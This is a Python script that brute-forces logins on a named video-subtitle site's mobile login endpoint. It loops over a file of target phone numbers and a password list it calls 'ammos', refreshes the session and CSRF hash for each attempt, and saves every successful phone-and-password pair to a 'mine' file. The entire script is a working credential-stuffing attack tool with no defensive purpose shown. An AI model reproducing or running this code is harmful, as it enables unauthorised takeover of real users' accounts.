#!/usr/bin/python3
# coding:utf-8


import sys
import requests
from lxml import etree
import json
import time


class DigCvnt:
  def __init__(self):
    self.url = "http://www.zmz2019.com/user/login"
    self.headers = {
      "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 OPR/55.0.2994.61",
      "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"
    }
    self.post_url = "http://www.zmz2019.com/user/login/mobile_login"
    self.post_headers = {
      "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 OPR/55.0.2994.61",
      "Accept":"application/json, text/javascript, */*; q=0.01",
      "Content-Type":"application/x-www-form-urlencoded",
      "Host":"www.zmz2019.com",
      "Origin":"http://www.zmz2019.com",
      "Referer":"http://www.zmz2019.com/user/login"
    }
    self.telList = []
    self.ammoList = []
    self.logInCount = 0

  def findTarget(self):
    print("**start program**")
    time.sleep(2)
    print("read matchedtels.txt...")
    try:
      with open("matchedtels.txt","r",encoding="utf-8") as f:
        l = 1
        while l:
          l = f.readline()
          tel = l.split("\n")[0]
          if tel != "":
            self.telList.append(tel)
      if len(self.telList) == 0:
        time.sleep(2)
        print("no target available, should try run cvntcry.py first...")
        sys.exit()
    except Exception as e:
      time.sleep(2)
      print("no target available, should try run cvntcry.py first...")
      sys.exit()
    print("find {} targets...".format(len(self.telList)))

  def aimTarget(self):
    time.sleep(2)
    print("read ammos.txt...")
    with open("ammos.txt","r",encoding="utf-8") as f:
      l = 1
      while l:
        l = f.readline()
        ammo = l.split("\n")[0]
        if ammo != "":
          self.ammoList.append(ammo)
    if len(self.ammoList) == 0:
      time.sleep(2)
      print("no ammo, should add password to ammos.txt first...")
      sys.exit()
    print("add {} ammos...".format(len(self.ammoList)))

  def getNewSession(self):
    print("get new session...")
    while True:
      session = requests.session()
      try:
        response = session.get(self.url,headers=self.headers)
      except Exception as e:
        print("get session err, try again...")
        time.sleep(2)
        continue
      if response.status_code == 200:
        break
      else:
        print("502...")
        time.sleep(2)
        continue
    newCookies = session.cookies.get_dict()
    html = response.content.decode()
    html = etree.HTML(html)
    newHash = html.xpath("//input[@name='__hash__']/@value")[0]
    return newHash,newCookies

  def digTarget(self):
    time.sleep(2)
    for tel in self.telList:
      print("try next target...")
      for ammo in self.ammoList:
        newHash,newCookies = self.getNewSession()
        post_data = {"area":"86","mobile":tel,"password":ammo,"__hash__":newHash}
        while True:
          try:
            response = requests.post(self.post_url,headers=self.post_headers,data=post_data,cookies=newCookies)
          except Exception as e:
            print("post request err, try again...")
            time.sleep(2)
            continue
          if response.status_code == 200:
            break
          else:
            print("502...")
            time.sleep(2)
            continue
        html = response.content.decode()
        html = json.loads(html)
        info = html["info"]
        if info == "手机号未注册，请先注册":
          print("tel wrong, skip and continue...")
          break
        elif info == "登陆成功":
          with open("mine.txt","a",encoding="utf-8") as f:
            f.write(tel + "  :  " + ammo + "\n")
          print("dig out one cvnt mine...")
          self.logInCount = 0
          break
        else:
          self.logInCount += 1
          if self.logInCount == 100:
            print("log in wrong 100 times...")
            self.logInCount = 0
    print("**end program**")

  def run(self):
    self.findTarget()
    self.aimTarget()
    self.digTarget()


if __name__ == "__main__":
  dig = DigCvnt()
  dig.run()
  
